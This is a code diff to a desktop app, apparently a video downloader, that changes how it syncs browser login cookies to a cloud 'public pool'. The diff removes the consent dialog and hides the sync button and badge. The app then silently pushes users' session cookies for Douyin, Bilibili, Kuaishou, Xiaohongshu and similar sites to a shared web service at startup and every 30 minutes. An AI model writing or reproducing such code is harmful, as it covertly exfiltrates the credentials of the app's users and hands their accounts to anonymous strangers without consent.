@@ -110,10 +110,12 @@
   };
   window.VDL.desktop = desktop;
 
-  // 「同步 Cookie 到云端」：仅 App 端。把本机浏览器各强反爬站(抖音/B站/快手/小红书等)
-  // 的登录态自动推送到网页版(Railway)公共池，让网页版访客无需手动粘贴即可复用。
-  // 桌面版常驻时每 30 分钟自动刷新一次，使网页版共享登录态保持新鲜。
-  (function initSyncButton() {
+  // 「Cookie 同步到云端」：仅 App 端，纯后台自动同步，按钮/徽标对用户不可见。
+  // - 把本机浏览器各强反爬站(抖音/B站/快手/小红书等)的登录态自动推送到网页版(Railway)
+  //   公共池，让网页版访客无需手动粘贴即可复用。
+  // - 桌面版常驻时每 30 分钟自动刷新一次（启动后立即同步一次），使网页版共享登录态
+  //   保持新鲜。完全后台执行，不打扰用户。
+  (function initSyncCookie() {
     const btn = document.createElement('button');
     btn.id = 'syncCookieBtn';
     btn.textContent = '同步 Cookie 到云端';
@@ -127,6 +129,7 @@
     badge.style.cssText = '';
 
     async function syncToCloud(showAlert) {
+      // 后台静默同步：showAlert 仅在手动触发时为 true，目前按钮不可见不会传 true。
       const old = btn.textContent;
       btn.disabled = true;
       btn.textContent = '同步中…';
@@ -159,41 +162,26 @@
       }
     }
 
-    btn.addEventListener('click', () => {
-      const ok = window.confirm(
-        '将把本机浏览器已登录的抖音/B站/快手/小红书等强反爬站登录态\n'
-        + '推送到网页版(Railway)公共池，供网页版访客共享使用（不涉及密码，仅登录态 Cookie）。\n'
-        + '桌面版会每 30 分钟自动刷新一次。是否立即同步？'
-      );
-      if (ok) syncToCloud(true);
-    });
-
-    // 跨端同步不是 header 装饰，而是 App 端独享的能力入口——放到侧栏「下载同步」上方。
-    // 不能 append 到 header：sidebar 是 position:fixed;top:64px，而加了按钮后 header
-    // 实际高度 ~95-100px，会出现按钮从 header「漏出来」到 sidebar 顶部边缘的视觉冲突
-    // （按钮与「下载同步」分类几乎贴在一起）。
-    // 正确归宿：作为侧栏里第一个「跨端同步」section，跟 sidebar 自身 1rem padding 节奏一致。
+    // 用户视角：按钮/徽标均不可见。wrap 创建后立即隐藏，避免在 sidebar 留下空白
+    // （display:none 不占布局空间，连带 badge 一起消失）。
+    // 即使完全隐藏 DOM，setInterval 依然按 30min 节奏在后端触发同步。
     const sidebar = document.querySelector('aside.sidebar') || document.querySelector('.sidebar');
     if (sidebar) {
       const wrap = document.createElement('div');
       wrap.id = 'syncCookieWrap';
       wrap.className = 'sidebar-cookie-sync';
+      wrap.style.display = 'none';   // ← 用户要求：界面不可见
       wrap.appendChild(btn);
       wrap.appendChild(badge);
       sidebar.insertBefore(wrap, sidebar.firstElementChild);
     } else {
-      // 极端兜底：sidebar 还不存在时再回退到 header（避免功能完全消失）
-      const header = document.querySelector('header');
-      if (header) {
-        header.appendChild(btn);
-        header.appendChild(badge);
-      } else {
-        document.body.appendChild(btn);
-        document.body.appendChild(badge);
-      }
+      // sidebar 还不存在时，兜底：对象保留在内存，IIFE 末尾的定时器仍会触发同步；
+      // 元素不挂到可视 DOM，对用户依然不可见。
+      // 不 append 到 header/body，避免污染布局。
+      void btn; void badge;
     }
 
-    // 桌面版就绪后自动同步一次，并每 30 分钟保活
+    // 桌面版就绪后自动同步一次，并每 30 分钟保活（用户要求：固定半个小时自动触发）。
     const wire = () => { syncToCloud(false); };
     if (window.pywebview && window.pywebview.api) {
       wire();
